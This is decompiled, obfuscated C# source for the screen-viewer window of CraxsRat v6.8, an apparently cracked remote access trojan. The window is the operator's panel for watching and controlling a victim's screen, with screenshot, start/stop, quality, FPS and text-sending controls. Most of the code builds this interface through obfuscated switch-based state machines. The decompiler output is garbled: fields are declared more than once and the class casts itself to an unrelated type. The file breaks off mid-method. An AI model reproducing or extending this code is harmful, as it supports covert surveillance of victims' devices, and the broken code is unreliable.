// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.ScreenShoter
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.My;
using Craxs_Rat.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class ScreenShoter : Form
  {
    public Client Classclient;
    public bool Acces_prog;
    public bool draw_prog;
    public bool install_prog;
    public bool battary_prog;
    private IContainer components;
    private IContainer components;
    public Client Classclient;
    public string Title;
    public object firstclick;
    public ScreenLoger LogScreen;
    private int tiks;
    private bool Swaping;
    private bool isdown;
    private bool isclick;
    public Size ScreenSize;
    private List<Point> Trakpoint;
    public TextBox \u0024VB\u0024Local_Type;
    public string[] \u0024VB\u0024Local_sizearry;
    public ScreenReader \u0024VB\u0024Me;
    private IContainer components;
    private bool isclick;
    private bool Swaping;
    private bool isdown;
    private List<Point> Trakpoint;

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = 2127477909;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 + (797693047 * 1615111850 - (682606599 * (363614086 ^ -1163027658) - ~~2003083649)) * -480789775 ^ ~--217028013 * -1419025307) + ((-1569376104 ^ 2002013851) + ~-936401284) ^ 1805728314 ^ 418200932)) % 4U)
          {
            case 0:
              ((Updater) this).components.Dispose();
              num1 = (int) num2 * 1148811323 ^ -809818780;
              continue;
            case 1:
              int num3 = ((Updater) this).components == null ? -1819045469 : (num3 = 1875252385);
              num1 = num3 ^ (int) num2 * -748621069;
              continue;
            case 2:
              goto label_3;
            case 3:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((Updater) this).components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (ScreenShoter));
label_1:
      int num1 = -1813217650;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~-(-1260145253 * 400891604 - ~~-num2)) % 383U)
        {
          case 0:
            this.Label7.Name = EXGuarder.\u003550F6223;
            num1 = (int) num3 * 1204520380 ^ 474176825;
            continue;
          case 1:
            this.DrakeUIAvatar7.Name = EXGuarder.\u00337686B77;
            num1 = (int) num3 * 722455913 ^ -1775651823;
            continue;
          case 2:
            this.scshotbtn.AvatarSize = 45;
            this.scshotbtn.Cursor = Cursors.Hand;
            this.scshotbtn.Dock = DockStyle.Top;
            this.scshotbtn.FillColor = Color.Transparent;
            num1 = (int) num3 * -518304578 ^ 1555515397;
            continue;
          case 3:
            this.checkblock.TextAlign = ContentAlignment.TopLeft;
            num1 = (int) num3 * 81941576 ^ 1301800201;
            continue;
          case 4:
            this.vewpnl.Margin = new Padding(4);
            num1 = (int) num3 * -1391534020 ^ 1210244349;
            continue;
          case 5:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar7, EXGuarder.\u00335716D54);
            this.combosize.Dock = DockStyle.Top;
            num1 = (int) num3 * 957846054 ^ 1370167468;
            continue;
          case 6:
            this.toptitle.Name = EXGuarder.\u00328286F0C;
            num1 = (int) num3 * -1026007501 ^ 1800884827;
            continue;
          case 7:
            this.DrakeUIToolTip1.SetToolTip((Control) this.checkblock, EXGuarder.\u00303154643);
            num1 = (int) num3 * -1883245009 ^ -584964788;
            continue;
          case 8:
            this.ShowIcon = false;
            this.Text = EXGuarder.\u0036971143F;
            ((ISupportInitialize) this.Livepicbox).EndInit();
            num1 = (int) num3 * -1564429771 ^ 194583004;
            continue;
          case 9:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar9, EXGuarder.\u00372261249);
            this.DrakeUIAvatar1.AvatarSize = 30;
            num1 = (int) num3 * -1874285901 ^ -1431489669;
            continue;
          case 10:
            this.Label5.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * -798026889 ^ -1090312817;
            continue;
          case 11:
            this.Save = new DrakeUICheckBox();
            num1 = (int) num3 * 1395601989 ^ -494227399;
            continue;
          case 12:
            this.checkblock.Style = UIStyle.Custom;
            this.checkblock.StyleCustomMode = true;
            num1 = (int) num3 * 363017933 ^ 1625079808;
            continue;
          case 13:
            this.combosize.StyleCustomMode = true;
            num1 = (int) num3 * 1404835894 ^ -139981942;
            continue;
          case 14:
            this.Panel6.Location = new Point(0, 0);
            this.Panel6.Margin = new Padding(4);
            num1 = (int) num3 * -1419131632 ^ 471902915;
            continue;
          case 15:
            this.Label4.Text = EXGuarder.\u0030D5D6943;
            num1 = (int) num3 * 1223799859 ^ 1247324157;
            continue;
          case 16:
            this.StartButton.Font = new Font(EXGuarder.\u00312702070, 12f);
            this.StartButton.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.StartButton.Icon = DrakeUIAvatar.UIIcon.Text;
            num1 = (int) num3 * 1747098305 ^ 1153690113;
            continue;
          case 17:
            this.DrakeUIAvatar5.Text = EXGuarder.\u00350556D70;
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar5, EXGuarder.\u003606E683E);
            num1 = (int) num3 * 231561381 ^ -2142770792;
            continue;
          case 18:
            this.Panel2.Name = EXGuarder.\u00305552413;
            this.Panel2.Size = new Size(424, 55);
            num1 = (int) num3 * 1131259053 ^ -280401648;
            continue;
          case 19:
            this.DrakeUIAvatar3.Style = UIStyle.Custom;
            num1 = (int) num3 * 911731095 ^ 1692121089;
            continue;
          case 20:
            this.chkctrl.Margin = new Padding(4);
            num1 = (int) num3 * 1087345583 ^ -1536377774;
            continue;
          case 21:
            this.PictureBox3.TabIndex = 1;
            num1 = (int) num3 * 1472465263 ^ 1067480189;
            continue;
          case 22:
            this.chkctrl.TabIndex = 31;
            num1 = (int) num3 * 1093084510 ^ 2128079387;
            continue;
          case 23:
            this.Panel8.Dock = DockStyle.Top;
            this.Panel8.Location = new Point(0, 0);
            num1 = (int) num3 * -1843220319 ^ 809004067;
            continue;
          case 24:
            this.DrakeUIAvatar5.Cursor = Cursors.Hand;
            num1 = (int) num3 * -1767606037 ^ 1549991453;
            continue;
          case 25:
            this.scshotbtn.Text = EXGuarder.\u003621F3858;
            this.DrakeUIToolTip1.SetToolTip((Control) this.scshotbtn, EXGuarder.\u00374632841);
            num1 = (int) num3 * 547045178 ^ -1288032499;
            continue;
          case 26:
            this.Label7.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Label7.Location = new Point(0, 575);
            num1 = (int) num3 * -1414894573 ^ 1202606000;
            continue;
          case 27:
            this.Label7.Size = new Size(100, 21);
            this.Label7.TabIndex = 25;
            num1 = (int) num3 * -638220201 ^ -1463411137;
            continue;
          case 28:
            this.SKtype.Style = UIStyle.Custom;
            num1 = (int) num3 * 646448061 ^ 512242773;
            continue;
          case 29:
            this.Label6.Size = new Size(100, 14);
            this.Label6.TabIndex = 23;
            num1 = (int) num3 * -1764519621 ^ 1475681780;
            continue;
          case 30:
            this.scshotbtn.TabIndex = 3;
            num1 = (int) num3 * -992173245 ^ 353497116;
            continue;
          case 31:
            this.DrakeUIAvatar3.FillColor = Color.Transparent;
            num1 = (int) num3 * -1148487771 ^ -1707304369;
            continue;
          case 32:
            this.StopButton.SymbolSize = 25;
            this.StopButton.TabIndex = 33;
            this.StopButton.Text = EXGuarder.\u00348343D6A;
            num1 = (int) num3 * -257582213 ^ -170064530;
            continue;
          case 33:
            this.Panel2 = new Panel();
            this.DrakeUIAvatar9 = new DrakeUIAvatar();
            this.DrakeUIAvatar1 = new DrakeUIAvatar();
            this.PictureBox3 = new PictureBox();
            num1 = (int) num3 * 412244727 ^ 610101017;
            continue;
          case 34:
            this.Panel6.Name = EXGuarder.\u00320592A0E;
            this.Panel6.Size = new Size(424, 868);
            this.Panel6.TabIndex = 2;
            num1 = (int) num3 * -739199977 ^ 789552241;
            continue;
          case 35:
            this.Label2.Margin = new Padding(4, 0, 4, 0);
            this.Label2.Name = EXGuarder.\u00371190A33;
            num1 = (int) num3 * -1614634147 ^ 1364228091;
            continue;
          case 36:
            this.pinbtn = new DrakeUIButtonIcon();
            ((ISupportInitialize) this.Livepicbox).BeginInit();
            this.vewpnl.SuspendLayout();
            num1 = (int) num3 * 191360387 ^ -1217213021;
            continue;
          case 37:
            this.DrakeUIAvatar3.Symbol = 61540;
            this.DrakeUIAvatar3.SymbolSize = 25;
            this.DrakeUIAvatar3.TabIndex = 35;
            this.DrakeUIAvatar3.Text = EXGuarder.\u00350556D70;
            num1 = (int) num3 * 1211593580 ^ 507394430;
            continue;
          case 38:
            this.scshotbtn.Location = new Point(0, 317);
            this.scshotbtn.Name = EXGuarder.\u0035B791257;
            num1 = (int) num3 * -1690974473 ^ -1552600266;
            continue;
          case 39:
            this.Panel8.Margin = new Padding(4);
            this.Panel8.Name = EXGuarder.\u003621B4F43;
            num1 = (int) num3 * -91937552 ^ 106446463;
            continue;
          case 40:
            this.SKtype.Dock = DockStyle.Top;
            this.SKtype.DropDownStyle = UIDropDownStyle.DropDownList;
            this.SKtype.FillColor = Color.Black;
            num1 = (int) num3 * -455749928 ^ 715770337;
            continue;
          case 41:
            this.DrakeUIAvatar1.Symbol = 61475;
            num1 = (int) num3 * 1209292726 ^ 397478012;
            continue;
          case 42:
            this.Label5.TabIndex = 22;
            num1 = (int) num3 * 714752474 ^ 1587538804;
            continue;
          case 43:
            this.Dismisbtn.Text = EXGuarder.\u00350556D70;
            num1 = (int) num3 * -690733684 ^ -1101925670;
            continue;
          case 44:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.BackColor = Color.Linen;
            num1 = (int) num3 * 1323440472 ^ -1725641130;
            continue;
          case 45:
            this.DrakeUIAvatar6.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIAvatar6.Location = new Point(67, 0);
            this.DrakeUIAvatar6.Name = EXGuarder.\u0031365071C;
            num1 = (int) num3 * 1416800420 ^ 2030078385;
            continue;
          case 46:
            this.DrakeUIAvatar9.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.DrakeUIAvatar9.Location = new Point(282, 13);
            num1 = (int) num3 * 1832408561 ^ 982406723;
            continue;
          case 47:
            this.toptitle.TabIndex = 21;
            num1 = (int) num3 * -813262979 ^ -241284930;
            continue;
          case 48:
            this.AutoScaleDimensions = new SizeF(8f, 16f);
            num1 = (int) num3 * 1400368506 ^ 1120788467;
            continue;
          case 49:
            this.Qualtibox.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num3 * -2034723872 ^ 1779661324;
            continue;
          case 50:
            this.Panel7.Controls.Add((Control) this.Label2);
            this.Panel7.Controls.Add((Control) this.Label4);
            num1 = (int) num3 * 1034750264 ^ 574388352;
            continue;
          case 51:
            this.Livepicbox.Dock = DockStyle.Fill;
            num1 = (int) num3 * 73586208 ^ 1471253726;
            continue;
          case 52:
            this.DrakeUIToolTip1.SetToolTip((Control) this.Save, EXGuarder.\u0030D022C09);
            num1 = (int) num3 * -370813242 ^ -1879007587;
            continue;
          case 53:
            this.PBS.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1810739709 ^ 465426805;
            continue;
          case 54:
            this.Save.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.Save.Cursor = Cursors.Hand;
            this.Save.Dock = DockStyle.Top;
            this.Save.Font = new Font(EXGuarder.\u00312702070, 10f);
            this.Save.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1684909078 ^ 243861330;
            continue;
          case 55:
            this.PBS.Text = EXGuarder.\u003316D4F04;
            this.Panel1.BackColor = Color.Black;
            num1 = (int) num3 * 581210344 ^ 2061553358;
            continue;
          case 56:
            this.Label2 = new Label();
            num1 = (int) num3 * 506601008 ^ -723020908;
            continue;
          case 57:
            this.FPSBOX.Padding = new Padding(0, 0, 30, 0);
            this.FPSBOX.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 547857551 ^ -1292184199;
            continue;
          case 58:
            this.SKtype.TabIndex = 28;
            num1 = (int) num3 * -379073552 ^ -1042895757;
            continue;
          case 59:
            this.Panel7.Controls.Add((Control) this.Dismisbtn);
            num1 = (int) num3 * -313971257 ^ 1078972395;
            continue;
          case 60:
            this.DrakeUIAvatar6.Text = EXGuarder.\u00350556D70;
            num1 = (int) num3 * -739368308 ^ 829441685;
            continue;
          case 61:
            this.Label5.Name = EXGuarder.\u003742C4212;
            num1 = (int) num3 * 35894815 ^ -208517583;
            continue;
          case 62:
            this.DrakeUIToolTip1.ForeColor = Color.FromArgb(239, 239, 239);
            num1 = (int) num3 * -2088570266 ^ -2070397064;
            continue;
          case 63:
            this.Panel2.BackColor = Color.Transparent;
            this.Panel2.Controls.Add((Control) this.pinbtn);
            this.Panel2.Controls.Add((Control) this.DrakeUIAvatar9);
            num1 = (int) num3 * 2139176490 ^ -2013552169;
            continue;
          case 64:
            this.vewpnl.BackgroundImageLayout = ImageLayout.Stretch;
            this.vewpnl.Controls.Add((Control) this.Livepicbox);
            num1 = (int) num3 * 498468463 ^ -1273156565;
            continue;
          case 65:
            this.Label2.Font = new Font(EXGuarder.\u00312702070, 10f);
            this.Label2.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1366868594 ^ 615112680;
            continue;
          case 66:
            this.textsend.Minimum = (double) int.MinValue;
            this.textsend.Name = EXGuarder.\u003542A7264;
            this.textsend.Padding = new Padding(7, 6, 7, 6);
            this.textsend.Radius = 10;
            this.textsend.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.textsend.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.textsend.Size = new Size(309, 32);
            num1 = (int) num3 * -1185147583 ^ -1471419888;
            continue;
          case 67:
            this.DrakeUIAvatar5.AvatarSize = 15;
            num1 = (int) num3 * -2140664572 ^ -718877138;
            continue;
          case 68:
            this.Dismisbtn.FillColor = Color.Transparent;
            num1 = (int) num3 * 1985726905 ^ -1672614774;
            continue;
          case 69:
            this.DrakeUIToolTip1.OwnerDraw = true;
            this.Timer1.Interval = 1;
            num1 = (int) num3 * 617353436 ^ 1941677022;
            continue;
          case 70:
            this.Panel1.SuspendLayout();
            this.Panel2.SuspendLayout();
            num1 = (int) num3 * 932561659 ^ 9982874;
            continue;
          case 71:
            this.Label4.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * -1419389979 ^ 244912924;
            continue;
          case 72:
            this.Label5.Text = EXGuarder.\u0030D5D6943;
            num1 = (int) num3 * 390699912 ^ -1087506146;
            continue;
          case 73:
            this.StopButton.Location = new Point(0, 76);
            this.StopButton.Name = EXGuarder.\u0035F090E5B;
            num1 = (int) num3 * -1882207518 ^ 807620374;
            continue;
          case 74:
            this.Dismisbtn.SymbolSize = 25;
            num1 = (int) num3 * -227630517 ^ 1933782387;
            continue;
          case 75:
            this.PictureBox3.TabStop = false;
            this.PictureBox2.Location = new Point(35, 13);
            num1 = (int) num3 * -1397925643 ^ 497867261;
            continue;
          case 76:
            this.DrakeUIAvatar4 = new DrakeUIAvatar();
            this.DrakeUIAvatar3 = new DrakeUIAvatar();
            this.DrakeUIToolTip1 = new DrakeUIToolTip(((Updater) this).components);
            this.Timer1 = new Timer(((Updater) this).components);
            num1 = (int) num3 * -2140878969 ^ -16719856;
            continue;
          case 77:
            this.vewpnl.TabIndex = 2;
            num1 = (int) num3 * -1223807166 ^ -638225992;
            continue;
          case 78:
            this.Panel3.Size = new Size(16, 754);
            num1 = (int) num3 * 579070747 ^ -1466596559;
            continue;
          case 79:
            this.chkctrl.TextAlign = ContentAlignment.TopLeft;
            num1 = (int) num3 * 1152908542 ^ 1689075198;
            continue;
          case 80:
            this.Panel1.Margin = new Padding(4);
            num1 = (int) num3 * 247425182 ^ -109060944;
            continue;
          case 81:
            this.chkctrl.Padding = new Padding(22, 0, 0, 0);
            num1 = (int) num3 * 110713145 ^ -88132684;
            continue;
          case 82:
            this.DrakeUIAvatar3.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -1499956628 ^ 1136444917;
            continue;
          case 83:
            this.Label5 = new Label();
            num1 = (int) num3 * 758984454 ^ -132129102;
            continue;
          case 84:
            this.DrakeUIAvatar5.Symbol = 61544;
            num1 = (int) num3 * -1369538280 ^ 1833982118;
            continue;
          case 85:
            this.pinbtn.BackColor = Color.Black;
            this.pinbtn.Cursor = Cursors.Hand;
            this.pinbtn.FillColor = Color.Black;
            this.pinbtn.Font = new Font(EXGuarder.\u00312702070, 12f);
            this.pinbtn.ForeColor = Color.Red;
            this.pinbtn.Location = new Point(126, 12);
            num1 = (int) num3 * -865958695 ^ 1286065644;
            continue;
          case 86:
            this.textsend.ForeColor = Color.White;
            this.textsend.Location = new Point(35, 6);
            num1 = (int) num3 * -1556355823 ^ 1071531897;
            continue;
          case 87:
            this.chkctrl.Enabled = false;
            num1 = (int) num3 * 820660155 ^ -594516339;
            continue;
          case 88:
            this.StopButton.AvatarSize = 45;
            this.StopButton.Cursor = Cursors.Hand;
            this.StopButton.Dock = DockStyle.Top;
            num1 = (int) num3 * 1718481374 ^ 1071334523;
            continue;
          case 89:
            this.Save.Location = new Point(0, 124);
            this.Save.Margin = new Padding(4);
            this.Save.Name = EXGuarder.\u003762B036A;
            num1 = (int) num3 * 1399520000 ^ -1981568353;
            continue;
          case 90:
            this.toptitle.Font = new Font(EXGuarder.\u00312702070, 9f);
            this.toptitle.ForeColor = Color.Lime;
            num1 = (int) num3 * 1176762408 ^ 1471323519;
            continue;
          case 91:
            this.DrakeUIAvatar6.FillColor = Color.Transparent;
            num1 = (int) num3 * -1979151034 ^ -854032011;
            continue;
          case 92:
            this.Panel7.Controls.Add((Control) this.SKtype);
            this.Panel7.Controls.Add((Control) this.scshotbtn);
            this.Panel7.Controls.Add((Control) this.chkctrl);
            num1 = (int) num3 * 1663646323 ^ 314511596;
            continue;
          case 93:
            this.PictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
            num1 = (int) num3 * 459542532 ^ -923982405;
            continue;
          case 94:
            this.Qualtibox.Font = new Font(EXGuarder.\u00312702070, 9f);
            this.Qualtibox.ForeColor = Color.FromArgb(65, 177, 225);
            num1 = (int) num3 * 1463756275 ^ 1099563343;
            continue;
          case 95:
            this.FPSBOX.Style = UIStyle.Custom;
            num1 = (int) num3 * -1383888701 ^ -654712936;
            continue;
          case 96:
            this.DrakeUIAvatar2.Name = EXGuarder.\u003621F3858;
            this.DrakeUIAvatar2.Size = new Size(46, 30);
            num1 = (int) num3 * 124211243 ^ -1497271208;
            continue;
          case 97:
            this.combosize.DropDownStyle = UIDropDownStyle.DropDownList;
            num1 = (int) num3 * 159570381 ^ 1551358559;
            continue;
          case 98:
            this.Dismisbtn.Symbol = 61473;
            num1 = (int) num3 * -653866442 ^ -1016737518;
            continue;
          case 99:
            this.Panel2.Controls.Add((Control) this.DrakeUIAvatar1);
            num1 = (int) num3 * 1695421013 ^ 714246744;
            continue;
          case 100:
            this.Label2.Dock = DockStyle.Top;
            num1 = (int) num3 * -348480378 ^ 1313487524;
            continue;
          case 101:
            this.DrakeUIAvatar5.FillColor = Color.Transparent;
            this.DrakeUIAvatar5.Font = new Font(EXGuarder.\u00312702070, 12f);
            num1 = (int) num3 * -1041281181 ^ 15721929;
            continue;
          case 102:
            this.presstimer.Interval = 1000;
            num1 = (int) num3 * 1281986442 ^ -1543061015;
            continue;
          case 103:
            this.vewpnl.Controls.Add((Control) this.Panel8);
            num1 = (int) num3 * -1489370885 ^ -2003497100;
            continue;
          case 104:
            this.DrakeUIAvatar2.Cursor = Cursors.Hand;
            num1 = (int) num3 * 1767177112 ^ 212047507;
            continue;
          case 105:
            this.Dismisbtn = new DrakeUIAvatar();
            num1 = (int) num3 * -1827759545 ^ -483344954;
            continue;
          case 106:
            this.Label1.Size = new Size(100, 21);
            num1 = (int) num3 * 2007027360 ^ 1168296263;
            continue;
          case 107:
            this.Panel1.Name = EXGuarder.\u003375A0B5D;
            num1 = (int) num3 * -1459524036 ^ -574760677;
            continue;
          case 108:
            this.DrakeUIAvatar4.Location = new Point(0, 772);
            this.DrakeUIAvatar4.Name = EXGuarder.\u0034860670F;
            num1 = (int) num3 * 1151959050 ^ 1245248419;
            continue;
          case 109:
            this.Panel8.Size = new Size(392, 22);
            this.Panel8.TabIndex = 2;
            this.toptitle.Dock = DockStyle.Fill;
            num1 = (int) num3 * 675515261 ^ 1211242947;
            continue;
          case 110:
            this.FPSBOX.Location = new Point(0, 470);
            num1 = (int) num3 * -61540411 ^ -830737935;
            continue;
          case 111:
            this.SKtype.RectDisableColor = Color.FromArgb(227, 242, 253);
            num1 = (int) num3 * 1777515340 ^ 1737211753;
            continue;
          case 112:
            this.StopButton.Style = UIStyle.Custom;
            num1 = (int) num3 * 1523041898 ^ 270561097;
            continue;
          case 113:
            this.Panel2.Controls.Add((Control) this.PictureBox3);
            this.Panel2.Controls.Add((Control) this.PictureBox2);
            this.Panel2.Dock = DockStyle.Top;
            num1 = (int) num3 * -1210360992 ^ -559611229;
            continue;
          case 114:
            this.DrakeUIAvatar6.AvatarSize = 15;
            this.DrakeUIAvatar6.Cursor = Cursors.Hand;
            num1 = (int) num3 * -940938626 ^ 2001498723;
            continue;
          case 115:
            this.Label1.Name = EXGuarder.\u0036B165B74;
            num1 = (int) num3 * -1388087203 ^ -1774221252;
            continue;
          case 116:
            this.Label7.Margin = new Padding(4, 0, 4, 0);
            num1 = (int) num3 * 1172959179 ^ -1103043415;
            continue;
          case 117:
            this.Label4.Name = EXGuarder.\u00308663431;
            this.Label4.Size = new Size(100, 10);
            num1 = (int) num3 * 364080574 ^ 244070551;
            continue;
          case 118:
            this.scshotbtn.Size = new Size(100, 48);
            num1 = (int) num3 * -593715246 ^ 286684411;
            continue;
          case 119:
            this.SKtype.Padding = new Padding(0, 0, 30, 0);
            this.SKtype.RectColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * 1134198326 ^ 807799740;
            continue;
          case 120:
            this.Label7.Font = new Font(EXGuarder.\u00312702070, 10f);
            num1 = (int) num3 * -1647198079 ^ -874911562;
            continue;
          case 121:
            this.FPSBOX.RectDisableColor = Color.FromArgb(227, 242, 253);
            this.FPSBOX.Size = new Size(100, 26);
            num1 = (int) num3 * -1848768768 ^ 1879313098;
            continue;
          case 122:
            this.Label1.TabIndex = 15;
            this.Label1.Text = EXGuarder.\u0034B376234;
            num1 = (int) num3 * -1238165252 ^ -1934187869;
            continue;
          case 123:
            this.DrakeUIAvatar9.Name = EXGuarder.\u0036378472E;
            num1 = (int) num3 * -973947897 ^ -61425257;
            continue;
          case 124:
            this.DrakeUIAvatar6.TabIndex = 31;
            num1 = (int) num3 * -721398418 ^ -368782495;
            continue;
          case 125:
            this.FPSBOX.TextAlignment = ContentAlignment.MiddleLeft;
            this.Label4.Dock = DockStyle.Top;
            num1 = (int) num3 * 1733579611 ^ -1504474309;
            continue;
          case 126:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar3, EXGuarder.\u003565A0A42);
            num1 = (int) num3 * 926691509 ^ -1493089717;
            continue;
          case (uint) sbyte.MaxValue:
            this.Livepicbox.Location = new Point(0, 22);
            this.Livepicbox.Margin = new Padding(4);
            num1 = (int) num3 * -1960270641 ^ -415040301;
            continue;
          case 128:
            this.pinbtn.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            num1 = (int) num3 * 698456551 ^ -1644372123;
            continue;
          case 129:
            this.Label2.Size = new Size(100, 21);
            num1 = (int) num3 * 493132628 ^ 630371611;
            continue;
          case 130:
            this.Panel4.TabIndex = 4;
            this.Panel5.BackColor = Color.Transparent;
            num1 = (int) num3 * -1119914543 ^ 802690407;
            continue;
          case 131:
            this.Label2.Location = new Point(0, 449);
            num1 = (int) num3 * -554263050 ^ -2033551413;
            continue;
          case 132:
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar6, EXGuarder.\u00322301B4E);
            num1 = (int) num3 * 282663201 ^ -276557588;
            continue;
          case 133:
            this.DrakeUIAvatar3.ForeColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            num1 = (int) num3 * -1491455187 ^ -850007697;
            continue;
          case 134:
            this.DrakeUIAvatar1.SymbolSize = 30;
            this.DrakeUIAvatar1.TabIndex = 2;
            this.DrakeUIAvatar1.Text = EXGuarder.\u0036614513D;
            this.DrakeUIToolTip1.SetToolTip((Control) this.DrakeUIAvatar1, EXGuarder.\u0033E3D586B);
            num1 = (int) num3 * -45826199 ^ 659719738;
            continue;
          case 135:
            this.scshotbtn.Symbol = 62024;
            num1 = (int) num3 * -1213342391 ^ -1074091290;
            continue;
          case 136:
            this.FPSBOX.StyleCustomMode = true;
            this.FPSBOX.TabIndex = 27;
            num1 = (int) num3 * -145328998 ^ 228821073;
            continue;
          case 137:
            this.chkctrl.Text = EXGuarder.\u00320485F66;
            num1 = (int) num3 * 1003968397 ^ -1758941891;
            continue;
          case 138:
            this.chkctrl.CheckBoxColor = Color.FromArgb((int) byte.MaxValue, 5, 17);
            this.chkctrl.Cursor = Cursors.Hand;
            this.chkctrl.Dock = DockStyle.Top;
            num1 = (int) num3 * -289902966 ^ -1450025538;
            continue;
          case 139:
            this.DrakeUIAvatar3.Name = EXGuarder.\u00350556D70;
            this.DrakeUIAvatar3.Size = new Size(100, 48);
            num1 = (int) num3 * -1731924058 ^ 1936708375;
            continue;
          case 140:
            this.Panel5.ResumeLayout(false);
            this.Panel6.ResumeLayout(false);
            this.Panel7.ResumeLayout(false);
            num1 = (int) num3 * 1972945364 ^ 1989191728;
            continue;
          case 141:
            this.Panel6.Dock = DockStyle.Fill;
            num1 = (int) num3 * -565832668 ^ 883778806;
            continue;
          case 142:
            this.StartButton.Symbol = 61457;
            num1 = (int) num3 * 825837401 ^ -69298581;
            continue;
          case 143:
            this.PictureBox3.Size = new Size(36, 28);
            num1 = (int) num3 * 607422275 ^ 1797898056;
            continue;
          case 144:
            this.BackgroundImageLayout = ImageLayout.Stretch;
            this.ClientSize = new Size(524, 868);
            this.Controls.Add((Control) this.Panel6);
            this.Controls.Add((Control) this.Panel7);
            this.DoubleBuffered = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.Margin = new Padding(4);
            num1 = (int) num3 * 1062463232 ^ 1110367829;
            continue;
          case 145:
            this.chkctrl.Name = EXGuarder.\u00306502B1F;
            num1 = (int) num3 * 1440956292 ^ -654545321;
            continue;
          case 146:
            this.Panel7.Controls.Add((Control) this.Qualtibox);
            num1 = (int) num3 * 1903904516 ^ 346900728;
            continue;
          case 147:
            this.PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
            this.PictureBox2.TabIndex = 0;
            num1 = (int) num3 * -974216960 ^ -1604130166;
            continue;
          case 148:
            this.PictureBox2.Margin = new Padding(4);
            this.PictureBox2.Name = EXGuarder.\u0033E31600A;
            num1 = (int) num3 * 859014529 ^ -472336003;
            continue;
          case 149:
            this.StopButton.Symbol = 61526;
            num1 = (int) num3 * 2122741298 ^ 1782663099;
            continue;
          case 150:
            this.Label7.Dock = DockStyle.Top;
            num1 = (int) num3 * 1092381779 ^ -1831976932;
            continue;
          case 151:
            this.StartButton = new DrakeUIAvatar();
            this.Panel9 = new Panel();
            num1 = (int) num3 * 575564356 ^ 1049039214;
            continue;
          case 152:
            this.StartButton.AvatarSize = 45;
            num1 = (int) num3 * 2050464002 ^ 496228787;
            continue;
          case 153:
            this.Label1 = new Label();
            this.Livepicbox = new PictureBox();
            this.vewpnl = new Panel();
            num1 = (int) num3 * 1277620368 ^ 150451766;
            continue;
          case 154:
            this.Panel1.Location = new Point(16, 55);
            num1 = (int) num3 * 1829118017 ^ -1655200139;
            continue;
          case 155:
            this.Label4.TabIndex = 21;
            num1 = (int) num3 * -1204622872 ^ 2019557060;
            continue;
          case 156:
            this.Panel7.Controls.Add((Control) this.DrakeUIAvatar7);
            this.Panel7.Controls.Add((Control) this.combosize);
            this.Panel7.Controls.Add((Control) this.Label7);
            num1 = (int) num3 * -1911305087 ^ 665921013;
            continue;
          case 157:
            this.Dismisbtn.Style = UIStyle.Custom;
            num1 = (int) num3 * -638718401 ^ 1840936489;
            continue;
          case 158:
            this.Dismisbtn.TabIndex = 29;
            num1 = (int) num3 * -1052388605 ^ 193239050;
            continue;
          case 159:
            this.PBS.MinimumSize = new Size(70, 23);
            this.PBS.Name = EXGuarder.\u003262D2678;
            num1 = (int) num3 * 212293793 ^ 262164803;
            continue;
          case 160:
            this.Label6.Font = new Font(EXGuarder.\u00312702070, 10f);
            num1 = (int) num3 * -216426571 ^ 608889853;
            continue;
          case 161:
            this.Qualtibox = new DrakeUIComboBox();
            num1 = (int) num3 * 2108560479 ^ 599340598;
            continue;
          case 162:
            this.Label2.TabIndex = 18;
            num1 = (int) num3 * -1128831832 ^ -36336875;
            continue;
          case 163:
            this.Qualtibox.Margin = new Padding(5, 6, 5, 6);
            this.Qualtibox.MinimumSize = new Size(84, 0);
